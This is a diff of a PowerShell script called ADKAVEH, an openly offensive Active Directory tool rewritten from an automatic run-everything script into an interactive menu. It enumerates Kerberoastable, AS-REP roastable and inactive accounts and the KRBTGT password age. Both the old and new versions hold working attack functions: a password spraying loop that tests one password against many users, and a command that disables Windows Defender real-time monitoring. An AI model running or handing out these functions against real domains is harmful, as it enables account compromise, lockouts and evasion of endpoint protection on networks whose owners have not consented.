@@ -1,298 +1,193 @@
-# Help function to display usage instructions
+
+```powershell
+param (
+    [switch]$Help
+)
+
 function Show-Help {
     Write-Host @"
 ========================================================
-Active Directory Enumeration and Attack Script by Kaveh
+ADKAVEH https://www.x.com/kavehxnet
 ========================================================
 
-Usage:
-    .\ADKAVEH.ps1 [-Help] [-Domain <DomainName>] [-Username <Username>] [-Password <Password>]
+This script is now an interactive tool for AD enumeration and attacks.
+Run the script without parameters to start the interactive menu.
 
 Options:
-    -Help              Show this help message and exit.
-    -Domain            Specify the domain name.
-    -Username          Specify the username.
-    -Password          Specify the password (will be prompted securely).
+    -Help           Show this help message and exit.
 
-Available Functions:
-    1. Disable-WindowsDefender
-       - Temporarily disables Windows Defender real-time monitoring.
-
-    2. Invoke-KerberoastingScan
-       - Scans for accounts with SPN (Service Principal Name) for Kerberoasting.
-
-    3. Invoke-ACLAbuseScan
-       - Checks for potential ACL (Access Control List) abuses.
-
-    4. Invoke-PasswordSprayingAttack
-       - Performs a password spraying attack using a test password.
-
-    5. Invoke-GoldenTicketDetection
-       - Detects potential Golden Ticket attacks in the domain.
-
-    6. Invoke-InactiveAccountDiscovery
-       - Finds inactive accounts (last logon > 90 days).
-
-    7. Invoke-GPOAbuse
-       - Scans for potential Group Policy Object (GPO) abuses.
-
-    8. Invoke-AdminSDHolderAbuse
-       - Checks for potential AdminSDHolder abuses.
-
-    9. Invoke-ASREPRoasting
-       - Scans for accounts vulnerable to AS-REP Roasting.
-
-    10. Invoke-UnconstrainedDelegationAbuse
-        - Scans for computers with unconstrained delegation.
-
-    11. Invoke-ConstrainedDelegationAbuse
-        - Scans for accounts with constrained delegation.
-
-Example:
-    .\ADKAVEH.ps1 -Domain example.com -Username admin -Password (Read-Host -AsSecureString)
+After starting, the script will prompt for credentials which will be
+used for all subsequent Active Directory queries.
 "@ -ForegroundColor Cyan
 }
 
-# Check if required modules are installed
-function Check-Modules {
-    $requiredModules = @("ActiveDirectory", "GroupPolicy")
-    foreach ($module in $requiredModules) {
-        if (-not (Get-Module -ListAvailable -Name $module)) {
-            Write-Host "Module $module is not installed. Please install it using: Install-WindowsFeature -Name RSAT-AD-PowerShell" -ForegroundColor Red
-            exit
-        }
-        Import-Module $module
-    }
-}
-
-# Temporarily disable Windows Defender
-function Disable-WindowsDefender {
-    Write-Host "Disabling Windows Defender temporarily..." -ForegroundColor Yellow
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true
-        Write-Host "Windows Defender has been temporarily disabled." -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to disable Windows Defender: $_" -ForegroundColor Red
-    }
-}
-
-# Collect Kerberoasting information (without Impacket)
-function Invoke-KerberoastingScan {
-    Write-Host "Starting Kerberoasting scan..." -ForegroundColor Yellow
-    try {
-        $spnAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
-        if ($spnAccounts) {
-            foreach ($account in $spnAccounts) {
-                Write-Host "Found SPN account: $($account.SamAccountName)" -ForegroundColor Cyan
-                $account.ServicePrincipalName | ForEach-Object { Write-Host "SPN: $_" -ForegroundColor Cyan }
-            }
-            Write-Host "Kerberoasting scan completed." -ForegroundColor Green
-        } else {
-            Write-Host "No SPN accounts found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "Kerberoasting scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Check ACL (Access Control List) for abuses (without PowerView)
-function Invoke-ACLAbuseScan {
-    Write-Host "Starting ACL Abuse scan..." -ForegroundColor Yellow
-    try {
-        $domainAdmins = Get-ADGroupMember -Identity "Domain Admins"
-        foreach ($admin in $domainAdmins) {
-            $acl = Get-Acl -Path "AD:\$($admin.DistinguishedName)"
-            $acl.Access | ForEach-Object {
-                if ($_.ActiveDirectoryRights -match 'WriteProperty') {
-                    Write-Host "Potential ACL abuse detected for $($admin.SamAccountName): $($_.ActiveDirectoryRights)" -ForegroundColor Cyan
-                }
-            }
-        }
-        Write-Host "ACL Abuse scan completed." -ForegroundColor Green
-    } catch {
-        Write-Host "ACL Abuse scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Password Spraying Attack
-function Invoke-PasswordSprayingAttack {
-    Write-Host "Starting Password Spraying attack..." -ForegroundColor Yellow
-    try {
-        $users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
-        $testPassword = "Password123"
-        foreach ($user in $users) {
-            Write-Host "Trying password for user: $user" -ForegroundColor Cyan
-            $securePassword = ConvertTo-SecureString $testPassword -AsPlainText -Force
-            $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
-            try {
-                Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $credential -ScriptBlock { whoami } -ErrorAction Stop
-                Write-Host "Successful login for user: $user" -ForegroundColor Green
-            } catch {
-                Write-Host "Failed login for user: $user" -ForegroundColor Red
-            }
-        }
-    } catch {
-        Write-Host "Password Spraying attack failed: $_" -ForegroundColor Red
-    }
-}
-
-# Detect Golden Ticket
-function Invoke-GoldenTicketDetection {
-    Write-Host "Starting Golden Ticket detection..." -ForegroundColor Yellow
-    try {
-        $events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10 -ErrorAction SilentlyContinue
-        if ($events) {
-            $events | ForEach-Object { Write-Host "Golden Ticket detected: $($_.Message)" -ForegroundColor Cyan }
-        } else {
-            Write-Host "No Golden Ticket events found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "Golden Ticket detection failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: Inactive Account Discovery
-function Invoke-InactiveAccountDiscovery {
-    Write-Host "Starting Inactive Account Discovery..." -ForegroundColor Yellow
-    try {
-        $inactiveThreshold = (Get-Date).AddDays(-90) # 90 days inactive
-        $inactiveAccounts = Get-ADUser -Filter {LastLogonDate -lt $inactiveThreshold} -Properties LastLogonDate
-        if ($inactiveAccounts) {
-            foreach ($account in $inactiveAccounts) {
-                Write-Host "Inactive account found: $($account.SamAccountName) (Last Logon: $($account.LastLogonDate))" -ForegroundColor Cyan
-            }
-        } else {
-            Write-Host "No inactive accounts found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "Inactive Account Discovery failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: GPO Abuse
-function Invoke-GPOAbuse {
-    Write-Host "Starting GPO Abuse scan..." -ForegroundColor Yellow
-    try {
-        $gpos = Get-GPO -All
-        foreach ($gpo in $gpos) {
-            Write-Host "Checking GPO: $($gpo.DisplayName)" -ForegroundColor Cyan
-            $gpoPermissions = Get-GPPermission -Guid $gpo.Id -All
-            foreach ($permission in $gpoPermissions) {
-                if ($permission.Trustee.SidType -eq "User" -and $permission.Permission -eq "GpoEditDeleteModifySecurity") {
-                    Write-Host "Potential GPO abuse detected: $($permission.Trustee.Name) has edit rights on $($gpo.DisplayName)" -ForegroundColor Cyan
-                }
-            }
-        }
-    } catch {
-        Write-Host "GPO Abuse scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: AdminSDHolder Abuse
-function Invoke-AdminSDHolderAbuse {
-    Write-Host "Starting AdminSDHolder Abuse scan..." -ForegroundColor Yellow
-    try {
-        $adminSDHolder = Get-ADObject -Filter { Name -eq "AdminSDHolder" } -Properties nTSecurityDescriptor
-        $acl = $adminSDHolder.nTSecurityDescriptor
-        $acl.Access | ForEach-Object {
-            if ($_.ActiveDirectoryRights -match 'WriteProperty') {
-                Write-Host "Potential AdminSDHolder abuse detected: $($_.IdentityReference) has write rights." -ForegroundColor Cyan
-            }
-        }
-    } catch {
-        Write-Host "AdminSDHolder Abuse scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: AS-REP Roasting
-function Invoke-ASREPRoasting {
-    Write-Host "Starting AS-REP Roasting scan..." -ForegroundColor Yellow
-    try {
-        $asRepAccounts = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
-        if ($asRepAccounts) {
-            foreach ($account in $asRepAccounts) {
-                Write-Host "AS-REP Roasting vulnerable account found: $($account.SamAccountName)" -ForegroundColor Cyan
-            }
-        } else {
-            Write-Host "No AS-REP Roasting vulnerable accounts found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "AS-REP Roasting scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: Unconstrained Delegation Abuse
-function Invoke-UnconstrainedDelegationAbuse {
-    Write-Host "Starting Unconstrained Delegation Abuse scan..." -ForegroundColor Yellow
-    try {
-        $unconstrainedComputers = Get-ADComputer -Filter { TrustedForDelegation -eq $true } -Properties TrustedForDelegation
-        if ($unconstrainedComputers) {
-            foreach ($computer in $unconstrainedComputers) {
-                Write-Host "Unconstrained Delegation vulnerable computer found: $($computer.Name)" -ForegroundColor Cyan
-            }
-        } else {
-            Write-Host "No Unconstrained Delegation vulnerable computers found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "Unconstrained Delegation Abuse scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Attack: Constrained Delegation Abuse
-function Invoke-ConstrainedDelegationAbuse {
-    Write-Host "Starting Constrained Delegation Abuse scan..." -ForegroundColor Yellow
-    try {
-        $constrainedAccounts = Get-ADObject -Filter { msDS-AllowedToDelegateTo -like "*" } -Properties msDS-AllowedToDelegateTo
-        if ($constrainedAccounts) {
-            foreach ($account in $constrainedAccounts) {
-                Write-Host "Constrained Delegation vulnerable account found: $($account.Name)" -ForegroundColor Cyan
-                $account.'msDS-AllowedToDelegateTo' | ForEach-Object { Write-Host "Allowed to delegate to: $_" -ForegroundColor Cyan }
-            }
-        } else {
-            Write-Host "No Constrained Delegation vulnerable accounts found." -ForegroundColor Yellow
-        }
-    } catch {
-        Write-Host "Constrained Delegation Abuse scan failed: $_" -ForegroundColor Red
-    }
-}
-
-# Main script execution
-if ($args[0] -eq "-Help") {
+if ($Help) {
     Show-Help
     exit
 }
 
-# Check if required modules are installed
+function Check-Modules {
+    Write-Host "[*] Checking for required modules..." -ForegroundColor Gray
+    $requiredModule = "ActiveDirectory"
+    if (-not (Get-Module -ListAvailable -Name $requiredModule)) {
+        Write-Host "[!] FATAL: Module '$requiredModule' is not installed. Please install RSAT-AD-PowerShell." -ForegroundColor Red
+        exit
+    }
+    Import-Module $requiredModule -ErrorAction SilentlyContinue
+    Write-Host "[+] '$requiredModule' module is loaded." -ForegroundColor Green
+}
+
+function Invoke-DisableDefender {
+    Write-Warning "This is a VERY noisy action and will likely trigger alerts. High privileges are required."
+    $confirm = Read-Host "Are you absolutely sure you want to proceed? (y/n)"
+    if ($confirm -ne 'y') {
+        Write-Host "[*] Operation cancelled by user." -ForegroundColor Yellow
+        return
+    }
+    Write-Host "[!] Attempting to disable Windows Defender real-time monitoring..." -ForegroundColor Yellow
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+        Write-Host "[+] Windows Defender real-time monitoring has been disabled." -ForegroundColor Green
+    } catch {
+        Write-Host "[!] FAILED to disable Windows Defender. Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Invoke-KerberoastingScan {
+    param($Credential)
+    Write-Host "[*] Scanning for user accounts with a Service Principal Name (SPN)..." -ForegroundColor Cyan
+    try {
+        $spnAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName, SamAccountName -Credential $Credential -ErrorAction Stop
+        if ($spnAccounts) {
+            Write-Host "[+] Found accounts vulnerable to Kerberoasting:" -ForegroundColor Green
+            return $spnAccounts | Select-Object SamAccountName, @{Name='SPNs';Expression={$_.ServicePrincipalName}}
+        } else {
+            Write-Host "[-] No accounts with an SPN were found." -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "[!] Kerberoasting scan failed. Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Invoke-ASREPRoastingScan {
+    param($Credential)
+    Write-Host "[*] Scanning for accounts with 'Do Not Require Pre-Authentication'..." -ForegroundColor Cyan
+    try {
+        $asRepAccounts = Get-ADUser -Filter {UserAccountControl -band 4194304} -Properties SamAccountName -Credential $Credential -ErrorAction Stop
+        if ($asRepAccounts) {
+            Write-Host "[+] Found accounts vulnerable to AS-REP Roasting:" -ForegroundColor Green
+            return $asRepAccounts | Select-Object SamAccountName
+        } else {
+            Write-Host "[-] No accounts vulnerable to AS-REP Roasting found." -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "[!] AS-REP Roasting scan failed. Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Invoke-InactiveAccountDiscovery {
+    param($Credential)
+    Write-Host "[*] Searching for accounts inactive for more than 90 days..." -ForegroundColor Cyan
+    try {
+        $inactiveThreshold = (Get-Date).AddDays(-90)
+        $inactiveAccounts = Get-ADUser -Filter {LastLogonTimeStamp -lt $inactiveThreshold.ToFileTime()} -Properties LastLogonDate, SamAccountName -Credential $Credential -ErrorAction Stop
+        if ($inactiveAccounts) {
+            Write-Host "[+] Found inactive accounts:" -ForegroundColor Green
+            return $inactiveAccounts | Select-Object SamAccountName, LastLogonDate | Sort-Object LastLogonDate
+        } else {
+            Write-Host "[-] No inactive accounts found." -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "[!] Inactive Account Discovery failed. Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Get-KrbTgtInfo {
+    param($Credential)
+    Write-Host "[*] Checking the KRBTGT account password last set time..." -ForegroundColor Cyan
+    Write-Host "[i] A KRBTGT password that has been changed twice in a short period can indicate a Golden Ticket attack." -ForegroundColor Gray
+    try {
+        $krbtgt = Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet, PwdLastSet -Credential $Credential -ErrorAction Stop
+        if ($krbtgt) {
+            Write-Host "[+] KRBTGT account information:" -ForegroundColor Green
+            return $krbtgt | Select-Object Name, DistinguishedName, PasswordLastSet
+        }
+    } catch {
+        Write-Host "[!] Could not retrieve KRBTGT info. Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Invoke-PasswordSprayingAttack {
+    param($Credential)
+    Write-Warning "This attack can cause account lockouts. Proceed with extreme caution."
+    $targetDomainController = (Get-ADDomainController -Discover -Service PrimaryDC).HostName
+    $passwordToTest = Read-Host "Enter the single password to spray"
+    $userListPath = Read-Host "Enter the path to a file containing one username per line"
+
+    if (-not (Test-Path $userListPath)) {
+        Write-Host "[!] User list file not found at '$userListPath'." -ForegroundColor Red
+        return
+    }
+    $users = Get-Content $userListPath
+
+    Write-Host "[*] Starting password spray against '$targetDomainController' with a 5-second delay between attempts..." -ForegroundColor Cyan
+    foreach ($user in $users) {
+        try {
+            $domainUser = "$($Credential.GetNetworkCredential().Domain)\$user"
+            $testCred = New-Object System.Management.Automation.PSCredential($domainUser, (ConvertTo-SecureString $passwordToTest -AsPlainText -Force))
+            
+            $null = New-PSDrive -Name "T" -PSProvider FileSystem -Root "\\$targetDomainController\C$" -Credential $testCred -ErrorAction Stop
+            Write-Host "[+] SUCCESS: Valid credentials for user: $user" -ForegroundColor Green
+            Remove-PSDrive -Name "T" -Force
+        } catch {
+            Write-Host "[-] FAILED: Invalid credentials for user: $user" -ForegroundColor Yellow
+        }
+        Start-Sleep -Seconds 5
+    }
+}
+
+Clear-Host
+Show-Help
 Check-Modules
 
-$domainName = Read-Host "Enter the domain name"
-$username = Read-Host "Enter the username"
-$password = Read-Host "Enter the password" -AsSecureString
+Write-Host "`nPlease provide credentials for Active Directory operations." -ForegroundColor Yellow
+$username = Read-Host "Enter Username"
+$domain = Read-Host "Enter Domain (e.g., contoso.local)"
+$password = Read-Host "Enter Password" -AsSecureString
+$credential = New-Object System.Management.Automation.PSCredential("$domain\$username", $password)
 
-try {
-    # Temporarily disable Windows Defender
-    Disable-WindowsDefender
+while ($true) {
+    Write-Host @"
 
-    # Gather generic AD info
-    Write-Host "Gathering generic AD info..." -ForegroundColor Yellow
-    Write-Host "Domain Name: $env:USERDOMAIN"
-    Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
-    Write-Host "Logon Server: $env:LOGONSERVER"
-    Write-Host "DNS Host Name: $(hostname)"
-    Write-Host "Computer Name: $(hostname)"
+==================== ADKAVEH Main Menu ====================
+    -- Enumeration --
+    1. Scan for Kerberoastable Accounts
+    2. Scan for AS-REP Roastable Accounts
+    3. Find Inactive User Accounts (>90 days)
+    4. Check KRBTGT Account Info (Golden Ticket Indicator)
 
-    # Run advanced scans
-    Invoke-KerberoastingScan
-    Invoke-ACLAbuseScan
-    Invoke-PasswordSprayingAttack
-    Invoke-GoldenTicketDetection
-    Invoke-InactiveAccountDiscovery
-    Invoke-GPOAbuse
-    Invoke-AdminSDHolderAbuse
-    Invoke-ASREPRoasting
-    Invoke-UnconstrainedDelegationAbuse
-    Invoke-ConstrainedDelegationAbuse
+    -- Attack & High-Risk --
+    5. Perform Password Spraying Attack
+    6. Disable Windows Defender (VERY NOISY!)
 
-} catch {
-    Write-Host "An error occurred: $_" -ForegroundColor Red
+    99. Exit
+============================================================
+"@ -ForegroundColor White
+
+    $choice = Read-Host "Enter your choice"
+
+    switch ($choice) {
+        '1' { Invoke-KerberoastingScan -Credential $credential | Format-Table -AutoSize }
+        '2' { Invoke-ASREPRoastingScan -Credential $credential | Format-Table -AutoSize }
+        '3' { Invoke-InactiveAccountDiscovery -Credential $credential | Format-Table -AutoSize }
+        '4' { Get-KrbTgtInfo -Credential $credential | Format-Table -AutoSize }
+        '5' { Invoke-PasswordSprayingAttack -Credential $credential }
+        '6' { Invoke-DisableDefender }
+        '99' {
+            Write-Host "[*] Exiting. Stay safe." -ForegroundColor Green
+            exit
+        }
+        default { Write-Host "[!] Invalid choice. Please try again." -ForegroundColor Red }
+    }
 }
+```
